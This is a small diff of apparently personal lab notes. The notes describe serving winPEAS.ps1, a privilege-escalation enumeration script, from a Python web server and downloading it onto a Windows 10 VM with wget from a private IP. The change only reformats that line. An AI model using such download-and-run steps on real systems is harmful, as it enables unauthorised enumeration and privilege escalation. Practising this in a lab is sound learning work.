@@ -24,6 +24,6 @@ started webserver to get winpeas to win10 vm
 python3 -m http.server 8000
 
 ON WINDOWS
-wget http://192.168.199.129:8000/winPEAS.ps1 -OutFile winPEAS.ps1
+```wget http://192.168.199.129:8000/winPEAS.ps1 -OutFile winPEAS.ps1```
 <img width="603" height="334" alt="image" src="https://github.com/user-attachments/assets/dfebb95e-397e-48ed-9f2a-9662e486cf6b" />
 
